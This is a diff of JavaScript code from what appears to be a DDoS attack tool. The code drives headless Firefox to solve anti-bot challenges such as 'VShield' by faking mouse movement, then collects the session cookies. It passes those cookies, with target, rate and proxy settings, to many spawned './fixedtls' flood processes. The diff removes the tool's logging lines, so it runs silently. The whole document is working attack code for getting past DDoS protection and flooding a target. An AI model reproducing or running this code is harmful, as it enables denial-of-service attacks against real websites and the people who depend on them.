@@ -152,7 +152,7 @@ function JSDetection(argument) {
 
 function solverInstance(args) {
 	return new Promise((resolve, reject) => {
-		log('(' + 'PlayWright'.cyan + `)`.white + ` Launching Playwright Instance.`.green);
+	
 		playwright.firefox.launch({
 			headless: true,
 
@@ -174,16 +174,13 @@ function solverInstance(args) {
 			const ua = await page.evaluate(
 				() => navigator.userAgent
 			);
-			log('(' + 'PlayWright'.cyan + `)` + ' PlayWright Assigned UA: '.yellow + `${ua}`.green);			
+				
 			const source = await page.content();
 			const title = await page.title()
 			const JS = await JSDetection(source);
-			if(title == "Access denied")
-			{
-				log('(' + 'JSDetect'.red + `)` + ' Access to the page was denied. ');	
-			}
+
 			if (JS) {
-				log('(' + 'JSDetect'.green + `)` + ' Detected JS Challenge: '.magenta + `(${JS.name})`.yellow);			
+					
 				if (JS.name == "VShield") {
 					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
 					await page.mouse.down();
@@ -198,19 +195,16 @@ function solverInstance(args) {
 					var [response] = await Promise.all([
 						page.waitForNavigation(),
 					])
-					log('(' + 'Navigations'.green + `) Browsers Waiting Navigation: ` + `${i}`.magenta);
+				
 				}
 			} else {
 			}
 			const title2 = await page.title()
 			const source2 = await page.content();
 			const JS2 = await JSDetection(source2);
-			if(title2 == "Access denied")
-			{
-				log('(' + 'JSDetect'.red + `)` + ' Access to the page was denied. ');	
-			}
+			
 			if (JS2) {
-				log('(' + 'JSDetect'.green + `)` + ' Detected JS Challenge:' + `(${JS2.name})`.yellow);			
+						
 
 				if (JS2.name == "VShield") {
 					await page.mouse.move(randomIntFromInterval(0), randomIntFromInterval(100));
@@ -226,7 +220,7 @@ function solverInstance(args) {
 					var [response] = await Promise.all([
 						page.waitForNavigation(),
 					])
-					log('(' + 'Navigations'.green + `) Passed navigation ID: ` + `[${i + 1}/${JS.navigations}]`.magenta);
+					
 					}
 			} else {
 			}			
@@ -234,12 +228,11 @@ function solverInstance(args) {
 
 			const cookies = cookiesToStr(await page.context().cookies());
 			const titleParsed = await page.title();
-			log('(' + 'Harvester'.green + ') Page Title: ' + `${titleParsed}`);
-            log('(' + 'Harvester'.green + ') Parsed Cookie: ' + `${cookies}`.yellow);
+		
 			for (let i = 0; i < args.Threads; i++) {
                 spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
             }
-			log('(' + 'PlayWright'.green + `) Session Solved.`);
+		
 			resolve(cookies);
 		})
 	})
